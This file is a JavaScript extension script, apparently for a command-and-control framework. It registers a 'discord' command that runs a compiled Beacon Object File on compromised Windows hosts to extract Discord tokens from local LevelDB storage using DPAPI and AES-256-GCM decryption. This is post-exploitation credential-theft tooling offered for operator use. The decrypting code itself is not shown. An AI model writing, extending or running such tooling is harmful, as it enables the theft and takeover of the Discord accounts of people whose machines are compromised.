var metadata = {
    name: "DiscordToken-BOF",
    description: "Extract Discord tokens from local storage using DPAPI + AES-256-GCM decryption"
};

/* Create the command */
var cmd_discord = ax.create_command(
    "discord",
    "Extract Discord tokens from local storage (LevelDB) using DPAPI + AES-256-GCM decryption",
    "discord"
);

/* PreHook: pack args and execute the BOF */
cmd_discord.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {

    let bof_path = ax.script_dir() + "_bin/discord_tokens." + ax.arch(id) + ".o";

    if (!ax.file_exists(bof_path)) {
        ax.console_message(id, "BOF file not found: " + bof_path + "\n", "error");
        return;
    }

    ax.execute_alias(id, cmdline, `execute bof ${bof_path}`, "Task: Discord Token Finder (BOF)");
});

/* Register the command group */
var grp = ax.create_commands_group("DiscordToken-BOF", [cmd_discord]);
ax.register_commands_group(grp, ["beacon", "gopher", "kharon"], ["windows"], []);

ax.log("[+] discord BOF command registered");
